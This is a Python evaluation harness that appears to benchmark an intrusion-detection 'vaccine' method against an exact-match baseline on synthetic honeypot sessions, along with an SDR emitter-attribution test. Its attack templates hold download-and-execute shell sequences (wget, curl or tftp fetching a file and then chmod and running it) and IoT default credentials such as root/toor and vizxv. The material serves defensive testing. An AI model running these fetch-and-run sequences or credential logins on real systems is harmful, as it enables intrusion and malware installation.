"""Reproducible evaluation harness (seeded, synthetic).

1. Detection: compares passive-vaccine detection (fuzzy clustering + benign-token stripping + held-out gating)
   against an exact-token-set baseline on mutated attack variants and look-alike benign sessions.
2. Attribution: CFO-estimation error and emitter-separation accuracy versus signal-to-noise ratio.
Numbers come from a synthetic corpus: they show relative behaviour, not real-world performance."""

from __future__ import annotations

import random
from collections.abc import Callable
from typing import Any

from . import analysis, sdr, vaccine
from .telemetry import Event

FAMILIES: dict[str, list[str]] = {
    "dropper": ["root", "toor", "wget http://{h}/{f}.sh", "chmod +x {f}.sh", "./{f}.sh"],
    "miner": ["uname -a", "cat /proc/cpuinfo", "curl http://{h}/{f} -o {f}", "chmod 777 {f}", "./{f}"],
    "scanner": ["admin", "admin", "enable", "show version", "show running-config", "exit"],
    "botnet": ["root", "vizxv", "/bin/busybox ECCHI", "tftp -g -r {f} {h}", "chmod 777 {f}", "sh {f}"],
}
DECOYS = ["whoami", "id", "uptime", "echo ok", "ls"]
FILES = ["bot", "update", "x86", "arm7", "payload", "setup", "agent", "sysd"]
BENIGN = [
    ["alice", "ls -la", "pwd"],
    ["bob", "cat notes.txt", "grep todo notes.txt"],
    ["carol", "wget https://docs.example/manual.pdf", "ls"],  # shares 'wget' with attacks
    ["dave", "chmod 644 notes.txt", "cat notes.txt"],  # shares 'chmod'
    ["erin", "uname -r", "df -h"],  # shares 'uname'
]


def _mk(lines: list[str], gap: float, i: int, ip: str) -> Event:
    return Event(float(i), "bench", ip + ":1", lines, [gap] * len(lines))


def corpus(seed: int = 0, per_family: int = 20, n_benign: int = 40) -> tuple[dict[str, list[Event]], list[Event]]:
    rnd = random.Random(seed)
    attacks: dict[str, list[Event]] = {}
    i = 0
    for fam, base in FAMILIES.items():
        attacks[fam] = []
        for _ in range(per_family):
            f, h = (
                rnd.choice(FILES) + str(rnd.randint(0, 9)),
                "10.%d.%d.%d" % (rnd.randint(0, 255), rnd.randint(0, 255), rnd.randint(1, 254)),
            )
            lines = [x.format(f=f, h=h) for x in base]
            if rnd.random() < 0.5:
                del lines[rnd.randrange(len(lines))]  # attacker skips a step
            if rnd.random() < 0.5:
                lines.insert(rnd.randrange(len(lines) + 1), rnd.choice(DECOYS))  # decoy command
            attacks[fam].append(_mk(lines, rnd.uniform(0.02, 0.2), i, "203.0.113.%d" % rnd.randint(1, 254)))
            i += 1
    benign = [
        _mk(list(rnd.choice(BENIGN)), rnd.uniform(1, 4), i + k, "198.51.100.%d" % rnd.randint(1, 254))
        for k in range(n_benign)
    ]
    return attacks, benign


def detection(seed: int = 0) -> dict[str, Any]:
    attacks, benign = corpus(seed)
    cut = int(len(benign) * 0.5)
    ben_train, ben_test = benign[:cut], benign[cut:]
    train: list[Event] = []
    test: dict[str, list[Event]] = {}
    for fam, evs in attacks.items():
        k = round(len(evs) * 0.6)
        train += evs[:k]
        test[fam] = evs[k:]
    vaccines = []
    for g in analysis.cluster(train):
        v, rep = vaccine.validate([train[i] for i in g], ben_train)
        if rep["safe_to_deploy"]:
            vaccines.append(v)
    exact = {frozenset(analysis.tokens(e)) for e in train}

    def ours(e: Event) -> bool:
        return any(vaccine.matches(v, e) for v in vaccines)

    def base(e: Event) -> bool:
        return frozenset(analysis.tokens(e)) in exact

    out: dict[str, Any] = {"vaccines": len(vaccines), "families": {}}
    for name, fn in (("vaccine", ours), ("exact_match", base)):
        allt = [e for evs in test.values() for e in evs]
        out[name] = {
            "recall": round(sum(map(fn, allt)) / len(allt), 2),
            "benign_fp_rate": round(sum(map(fn, ben_test)) / len(ben_test), 2),
        }
        out["families"][name] = {f: round(sum(map(fn, evs)) / len(evs), 2) for f, evs in test.items()}
    return out


def attribution(
    seed: int = 0, trials: int = 30, snrs: tuple[float, ...] = (0, 5, 10, 20, 30)
) -> list[dict[str, float]]:
    rnd = random.Random(seed)
    rows = []
    for snr in snrs:
        err, ok = 0.0, 0
        for _ in range(trials):
            a = rnd.uniform(-4000, 4000)
            b = a + 600  # two emitters 600 Hz apart
            truth = [a + rnd.uniform(-30, 30) for _ in range(6)] + [b + rnd.uniform(-30, 30) for _ in range(6)]
            obs = []
            for j, c in enumerate(truth):
                est, p = sdr.estimate(sdr.synth_iq(c, n=1024, snr_db=snr, seed=rnd.randrange(10**9)), 250_000)
                err += abs(est - c) / len(truth)
                obs.append(sdr.Obs(float(j), 0, p, est))
            sdr.assign_emitters(obs)
            ok += (
                len({o.emitter_id for o in obs[:6]}) == 1
                and len({o.emitter_id for o in obs[6:]}) == 1
                and obs[0].emitter_id != obs[6].emitter_id
            )
        rows.append(
            {"snr_db": snr, "mean_abs_err_hz": round(err / trials, 1), "separation_accuracy": round(ok / trials, 2)}
        )
    return rows


def run(out: Callable[[str], Any] = print, seed: int = 0) -> dict[str, Any]:
    d = detection(seed)
    out("Detection on held-out mutated sessions (%d vaccines)" % d["vaccines"])
    out("  %-12s recall  benign-FP" % "method")
    for m in ("vaccine", "exact_match"):
        out("  %-12s %-7s %s" % (m, d[m]["recall"], d[m]["benign_fp_rate"]))
    out("  per-family recall: " + str(d["families"]["vaccine"]))
    a = attribution(seed)
    out("Attribution vs SNR (two emitters 600 Hz apart)")
    out("  snr_db  mean_abs_err_hz  separation_accuracy")
    for r in a:
        out("  %-7s %-16s %s" % (r["snr_db"], r["mean_abs_err_hz"], r["separation_accuracy"]))
    return {"detection": d, "attribution": a}
